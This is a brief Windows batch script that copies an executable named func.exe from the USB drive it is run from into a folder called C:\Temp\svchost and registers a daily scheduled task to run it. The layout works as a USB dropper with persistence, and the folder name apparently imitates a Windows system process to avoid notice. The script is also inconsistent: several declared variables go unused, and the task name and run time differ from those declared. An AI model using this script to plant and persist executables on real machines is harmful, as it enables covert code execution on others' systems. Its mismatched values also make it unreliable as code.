@echo off

:: Define variables
set taskname=MyScheduledTask
set exename=func.exe
set usbfolder=%~d0\
set destfolder=C:\Temp\svchost
set exepath="%destfolder%\%exename%"
set time=12:00

:: Create destination folder if it doesn't exist
if not exist "%destfolder%" (
  mkdir "%destfolder%"
)

:: Copy the .exe file from the USB drive to the destination folder
copy /y "%usbfolder%%exename%" "%destfolder%"

:: Create a scheduled task to run the .exe file daily at the specified time
schtasks /create /tn "MyTask" /tr "C:\Temp\svchost\func.exe" /sc daily /st 15:30
